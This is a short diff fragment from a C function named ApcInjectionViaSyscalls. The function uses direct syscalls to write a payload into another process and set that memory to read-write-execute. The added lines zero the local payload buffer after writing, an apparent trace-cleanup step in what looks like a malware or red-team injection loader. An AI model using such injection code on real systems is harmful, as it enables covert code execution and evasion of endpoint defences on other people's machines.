@@ -27,6 +27,9 @@ BOOL ApcInjectionViaSyscalls(HANDLE hProcess, HANDLE hThread, PVOID pPayload, SI
 	}
 	printf("[*] Bytes Written :: %d of %d \n", sNumberOfBytesWritten, sSize);
 
+	// cleaning up the heap
+	ZeroMemory(pPayload, sSize);
+
 	// Changing the memory's permissions to RWX
 	if ((STATUS = Sw3NtProtectVirtualMemory(hProcess, &pAddress, &sSize, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0)
 	{
